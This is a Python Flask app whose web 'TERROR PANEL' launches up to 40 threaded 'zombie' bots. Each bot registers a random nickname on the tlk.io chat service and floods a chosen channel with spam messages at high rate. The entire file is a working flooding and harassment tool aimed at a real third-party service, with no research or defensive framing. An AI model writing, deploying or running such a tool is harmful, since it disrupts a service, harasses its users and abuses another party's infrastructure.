# app.py
from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import time
import random
import string
import os

app = Flask(__name__)

running = False
stats = {"sent": 0, "zombies": 0}

HTML = """
<!DOCTYPE html>
<html>
<head>
<title>tlk.io TERROR</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { background:#0a0a12; color:#0f0; font-family:Consolas,monospace; padding:16px; margin:0; }
h1 { color:#ff00ff; font-size:1.4rem; }
input, textarea, button { background:#111; color:#0f0; border:1px solid #0f0; padding:8px; margin:4px 0; width:100%; box-sizing:border-box; }
button { cursor:pointer; font-weight:bold; }
button:active { background:#0f0; color:#000; }
#log { height:260px; overflow-y:auto; background:#000; border:1px solid #0f0; padding:8px; font-size:13px; }
.row { display:flex; gap:8px; }
.row input { flex:1; }
</style>
</head>
<body>
<h1>◈ tlk.io TERROR PANEL</h1>
<label>Channel</label>
<input id="channel" value="hey">
<label>Messages (한 줄에 하나)</label>
<textarea id="msgs" rows="4">◈ SYSTEM
좀비 웨이브
NEON
404
tlk OWNED</textarea>
<div class="row">
  <div><label>Zombies</label><input id="threads" value="20" type="number"></div>
  <div><label>Delay(ms)</label><input id="delay" value="40" type="number"></div>
</div>
<button onclick="start()">▶ LAUNCH</button>
<button onclick="stop()">■ KILL</button>
<p>Sent: <b id="sent">0</b> | Zombies: <b id="zombies">0</b></p>
<div id="log"></div>
<script>
function log(t){const d=document.getElementById('log');d.innerHTML+=t+'<br>';d.scrollTop=d.scrollHeight;}
function start(){
  fetch('/start',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      channel:document.getElementById('channel').value.trim(),
      messages:document.getElementById('msgs').value.split('\\n').filter(x=>x.trim()),
      threads:parseInt(document.getElementById('threads').value)||10,
      delay:parseInt(document.getElementById('delay').value)||50
    })}).then(r=>r.json()).then(d=>log(d.msg));
}
function stop(){fetch('/stop').then(r=>r.json()).then(d=>log(d.msg));}
setInterval(()=>fetch('/stats').then(r=>r.json()).then(d=>{
  document.getElementById('sent').innerText=d.sent;
  document.getElementById('zombies').innerText=d.zombies;
}),600);
</script>
</body>
</html>
"""

def random_nick():
    return random.choice(["NEON","GHOST","VOID","ZOMBIE","NULL","X","GLITCH"]) + "".join(random.choices(string.ascii_lowercase + string.digits, k=4))

def worker(channel, messages, delay_ms):
    global running, stats
    nick = random_nick()
    stats["zombies"] += 1
    session = requests.Session()
    try:
        r = session.post("https://tlk.io/api/participant", json={"nickname": nick}, timeout=8)
        if r.status_code != 200:
            stats["zombies"] -= 1
            return
        while running:
            try:
                msg = random.choice(messages)
                session.post(
                    f"https://tlk.io/api/chats/{channel}/messages",
                    json={"body": msg, "nickname": nick},
                    timeout=4
                )
                stats["sent"] += 1
                time.sleep(max(0.02, delay_ms / 1000))
            except:
                time.sleep(0.4)
    finally:
        stats["zombies"] -= 1

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/start", methods=["POST"])
def start():
    global running
    if running:
        return jsonify({"msg": "이미 실행중"})
    data = request.json
    channel = data.get("channel", "hey")
    messages = data.get("messages", ["spam"])
    threads = min(40, max(1, int(data.get("threads", 15))))
    delay = max(20, int(data.get("delay", 50)))
    running = True
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(channel, messages, delay), daemon=True)
        t.start()
        time.sleep(0.03)
    return jsonify({"msg": f"LAUNCH {threads} ZOMBIES | {delay}ms"})

@app.route("/stop")
def stop():
    global running
    running = False
    return jsonify({"msg": "KILL"})

@app.route("/stats")
def get_stats():
    return jsonify(stats)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)